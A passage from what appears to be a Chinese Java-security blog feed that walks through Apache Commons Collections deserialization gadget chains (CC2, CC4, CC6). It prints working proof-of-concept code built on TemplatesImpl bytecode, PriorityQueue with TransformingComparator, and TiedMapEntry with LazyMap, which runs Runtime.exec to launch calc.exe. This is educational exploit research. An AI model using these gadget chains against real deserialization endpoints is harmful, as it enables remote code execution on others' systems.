class="string">&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABVUZW1wbGF0ZXNJbXBsQ2xzLmphdmEMAA4ADwcAGwwAHAAdAQAMSGVsbG8gV29ybGQhBwAeDAAfACABABBUZW1wbGF0ZXNJbXBsQ2xzAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgAhAAUABgAAAAAAAwABAAcACAACAAkAAAAZAAAAAwAAAAGxAAAAAQAKAAAABgABAAAADAALAAAABAABAAwAAQAHAA0AAgAJAAAAGQAAAAQAAAABsQAAAAEACgAAAAYAAQAAABEACwAAAAQAAQAMAAEADgAPAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAATAAQAFAAMABUAAQAQAAAAAgAR&quot;</span>);</span><br><span class="line">        SetFieldValue(<span class="string">&quot;_name&quot;</span>, templates, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        SetFieldValue(<span class="string">&quot;_bytecodes&quot;</span>, templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        SetFieldValue(<span class="string">&quot;_tfactory&quot;</span>, templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer[] fakeTransformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        PriorityQueue priorityQueue=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer));</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line">        SetFieldValue(<span class="string">&quot;iTransformers&quot;</span>,chainedTransformer,transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;./a.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            file.createNewFile();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//创建输出流和输入流</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        objectOutputStream.writeObject(priorityQueue);</span><br><span class="line">        Object o=objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230822171130387.png"
                      alt="image-20230822171130387"
                ></p>
<p>除此之外，如果能够理解上面CommonsCollections2给的两个例子。这里就可以很容易写出不使用<code>ChainedTransformer</code>的demo：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections4</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">SetFieldValue</span><span class="params">(String FieldName,Object object,Object value)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Field field=object.getClass().getDeclaredField(FieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABVUZW1wbGF0ZXNJbXBsQ2xzLmphdmEMAA4ADwcAGwwAHAAdAQAMSGVsbG8gV29ybGQhBwAeDAAfACABABBUZW1wbGF0ZXNJbXBsQ2xzAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgAhAAUABgAAAAAAAwABAAcACAACAAkAAAAZAAAAAwAAAAGxAAAAAQAKAAAABgABAAAADAALAAAABAABAAwAAQAHAA0AAgAJAAAAGQAAAAQAAAABsQAAAAEACgAAAAYAAQAAABEACwAAAAQAAQAMAAEADgAPAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAATAAQAFAAMABUAAQAQAAAAAgAR&quot;</span>);</span><br><span class="line">        SetFieldValue(<span class="string">&quot;_name&quot;</span>, templates, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        SetFieldValue(<span class="string">&quot;_bytecodes&quot;</span>, templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        SetFieldValue(<span class="string">&quot;_tfactory&quot;</span>, templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        Transformer transformer=<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line">        InstantiateTransformer instantiateTransformer=<span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">        TransformingComparator transformingComparator=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br><span class="line">        PriorityQueue priorityQueue=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">2</span>, transformingComparator);</span><br><span class="line">        priorityQueue.add(TrAXFilter.class);</span><br><span class="line">        priorityQueue.add(TrAXFilter.class);</span><br><span class="line">        SetFieldValue(<span class="string">&quot;transformer&quot;</span>,transformingComparator,instantiateTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;./a.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            file.createNewFile();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//创建输出流和输入流</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        objectOutputStream.writeObject(priorityQueue);</span><br><span class="line">        Object o=objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>CommonsCollections2和CommonsCollections4的核心就是:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(Transformer&lt;? <span class="built_in">super</span> I, ? <span class="keyword">extends</span> <span class="title class_">O</span>&gt; transformer)</span><br></pre></td></tr></table></figure>

<p><code>PriorityQueue#readObject()</code>-&gt;<code>TransformingComparator#compare()</code>-&gt;<code>Transformer#transform(new Object())</code>，<code>transform()</code>的参数通过<code>PriorityQueue#add()</code>获取。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230822173003645.png"
                      alt="image-20230822173003645"
                ></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>CommonsCollections6链</title>
    <url>/2023/07/17/CommonsCollections6%E9%93%BE/</url>
    <content><![CDATA[<h2 id="Why-CommonsCollections6"><a href="#Why-CommonsCollections6" class="headerlink" title="Why CommonsCollections6?"></a>Why CommonsCollections6?</h2><p><code>CC1的条件：Apache Commons Collections 3.1-3.2.1&amp;&amp;JDK&lt;8u71。CC6便是为了解决JDK&gt;=8u71的情况</code></p>
<p>在<code>JDK&gt;=8u71</code>时，<code>AnnotationInvocationHandler.readObject()</code>如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">var2</span> <span class="operator">=</span> var1.readFields();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">var3</span> <span class="operator">=</span> (Class)var2.get(<span class="string">&quot;type&quot;</span>, (Object)<span class="literal">null</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">var4</span> <span class="operator">=</span> (Map)var2.get(<span class="string">&quot;memberValues&quot;</span>, (Object)<span class="literal">null</span>);</span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var5 = AnnotationType.getInstance(var3);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var13) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">var6</span> <span class="operator">=</span> var5.memberTypes();</span><br><span class="line">    <span class="type">LinkedHashMap</span> <span class="variable">var7</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>();</span><br><span class="line"></span><br><span class="line">    String var10;</span><br><span class="line">    Object var11;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">Iterator</span> <span class="variable">var8</span> <span class="operator">=</span> var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) &#123;</span><br><span class="line">        Map.<span class="type">Entry</span> <span class="variable">var9</span> <span class="operator">=</span> (Map.Entry)var8.next();</span><br><span class="line">        var10 = (String)var9.getKey();</span><br><span class="line">        var11 = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">var12</span> <span class="operator">=</span> (Class)var6.get(var10);</span><br><span class="line">        <span class="keyword">if</span> (var12 != <span class="literal">null</span>) &#123;</span><br><span class="line">            var11 = var9.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!var12.isInstance(var11) &amp;&amp; !(var11 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                var11 = (<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(objectToString(var11))).setMember((Method)var5.members().get(var10));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler.UnsafeAccessor.setType(<span class="built_in">this</span>, var3);</span><br><span class="line">    AnnotationInvocationHandler.UnsafeAccessor.setMemberValues(<span class="built_in">this</span>, var7);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>获取传递进来的反序列化类的<code>type</code>和<code>memberValues</code>，<code>memberValues</code>记录类字段名和字段值。根据<code>type</code>生成新的类，若类中的字段在反序列化类中存在时，将字段名和字段值存入<code>LinkHashMap</code>中。</p>
<p>和低版本的<code>readObject()</code>进行比较，发现并没有调用外部类的方法，也就没有办法调用<code>TransformedMap.checkSetValue()</code>和<code>LazyMap.get()</code>。</p>
<h2 id="构造CommonsCollections6"><a href="#构造CommonsCollections6" class="headerlink" title="构造CommonsCollections6"></a>构造CommonsCollections6</h2><p>由于CC6是解决CC1在高版本不适用的问题。因此CC6的关键点就在于：能否找到一个类，通过某种方式调用了<code>LazyMap.get()</code>或<code>TransformedMap.checkSetValue()</code>。</p>
<p>这里引入一个新的类：<code>org.apache.commons.collections.keyvalue.TiedMapEntry</code></p>
<h3 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h3><p>在该类中主要关注如下三个方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//构造方法</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//getValue()</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.map.get(<span class="built_in">this</span>.key);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//hashCode()</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.getValue();</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">this</span>.getKey() == <span class="literal">null</span> ? <span class="number">0</span> : <span class="built_in">this</span>.getKey().hashCode()) ^ (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>调用关系：<code>hashCode()</code>-&gt;<code>getValue()</code>-&gt;<code>LazyMap.get()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//构造CC链</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;C:\\Windows\\System32\\calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        Map innerMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//创建LasyMap</span></span><br><span class="line">        Map lazyMap= LazyMap.decorate(innerMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tme=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        tme.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230718221213548.png"
                      alt="image-20230718221213548"
                ></p>
<h3 id="构造CommonsCollections6-1"><a href="#构造CommonsCollections6-1" class="headerlink" title="构造CommonsCollections6"></a>构造CommonsCollections6</h3><p>很显然想要构造完整的Gadget，需要找到一个类，该类的<code>readObject()</code>方法可以执行<code>TiedMapEntry.hashcode()</code>。在URLDNS章节分析ysoserial时，有提到过：当执行<code>hash(key)</code>时会执行<code>key.hashcode()</code>，而<code>HashMap.readObject()</code>恰巧有<code>hash(key)</code>的操作。</p>
<p>因此我们构造如下Gadget：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//创建文件存储序列化数据</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;./a.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            file.createNewFile();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//创建输出流和输入流</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="comment">//构造CC链</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;C:\\Windows\\System32\\calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        Map innerMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//创建LasyMap</span></span><br><span class="line">        Map lazyMap= LazyMap.decorate(innerMap,chainedTransformer);</span><br><span class="line">        Map outerMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        TiedMapEntry tme=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        outerMap.put(tme,<span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        objectOutputStream.writeObject(outerMap);</span><br><span class="line">        Object o=objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230718223747732.png"
                      alt="image-20230718223747732"
                ></p>
<p>我们执行之后发现成功弹出了计算器。看似一切顺利，皆大欢喜，其实这里有个很大的坑。</p>
<p>观察如下截图：当序列化和反序列化两行代码被注释时，仍然可以成功弹出计算器。也就是说弹计算器和反序列化无关，和<code>HashMap.readObject()</code>无关。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230718224043353.png"
                      alt="image-20230718224043353"
                ></p>
<p>为什么会产生这种情况？其实这点在URLDNS章节也同样提到了，在URLDNS章节分析时提到过应当会发起两次DNS请求，原因就在于<code>HashMap.put()</code>方法也会调用<code>hash(key)</code>进一步调用<code>key.hashcode()</code>。这里的计算器就是由<code>outerMap.put()</code>执行的。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230718230617722.png"
                      alt="image-20230718230617722"
                ></p>
<p>那为什么这里只弹出了一个计算器而不是两个？这里就要看一下<code>LazyMap.get()</code>了。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230718231741317.png"
                      alt="image-20230718231741317"
                ></p>
